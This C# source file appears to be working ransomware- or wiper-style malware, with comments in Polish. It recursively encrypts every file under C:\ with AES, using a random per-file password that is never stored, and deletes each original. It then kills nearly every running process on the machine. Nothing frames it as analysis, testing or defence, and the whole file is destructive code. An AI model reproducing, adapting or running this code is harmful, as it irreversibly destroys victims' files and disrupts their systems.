using System;
using System.Diagnostics;
using System.ComponentModel;
using System.IO;
using System.Security.Cryptography;
using System.Text;
using System.Runtime.InteropServices;
using System.Threading;
using System.Runtime.Versioning;

class Program
{
    static void Main()
    {
        int currentProcessId = Process.GetCurrentProcess().Id;

        string path = @"C:\";

        var allFiles = Directory.GetFiles(path, "*", SearchOption.AllDirectories);
        foreach(var file in allFiles)
        {
            Random key = new Random();

            try
            {
                EncryptFile(file, file + ".enc", key.Next().ToString());
                File.Delete(file);
            }
            catch
            {
                continue;
            }
        }
        foreach (var p in Process.GetProcesses())
        {
            try
            {
                if (p.Id == 0 || p.Id == currentProcessId) 
                    continue; // pomijamy systemowe i własny proces

                if (!p.HasExited)
                {
                    try
                    {
                        p.Kill();
                    }
                    catch (Win32Exception ex) when (ex.NativeErrorCode == 5)
                    {
                        
                    }
                    catch
                    {
                        continue;
                    }
                }
            }
            catch
            {
                continue;
            }
        }

        foreach (var process in Process.GetProcessesByName("Malware"))
        {
            try
            {
                process.Kill();
            }
            catch
            {
                continue;
            }
        }
    }

    static void EncryptFile(string inputFile, string outputFile, string password)
    {
        byte[] key, iv;
        using (var sha256 = SHA256.Create())
        {
            key = sha256.ComputeHash(Encoding.UTF8.GetBytes(password));
        }
        iv = new byte[16]; // AES wymaga 16-bajtowego IV (tu zerowy, można losowy)

        using (Aes aes = Aes.Create())
        {
            aes.Key = key;
            aes.IV = iv;

            using (FileStream fsOut = new FileStream(outputFile, FileMode.Create))
            using (CryptoStream cs = new CryptoStream(fsOut, aes.CreateEncryptor(), CryptoStreamMode.Write))
            using (FileStream fsIn = new FileStream(inputFile, FileMode.Open))
            {
                fsIn.CopyTo(cs);
            }
        }
    }
}
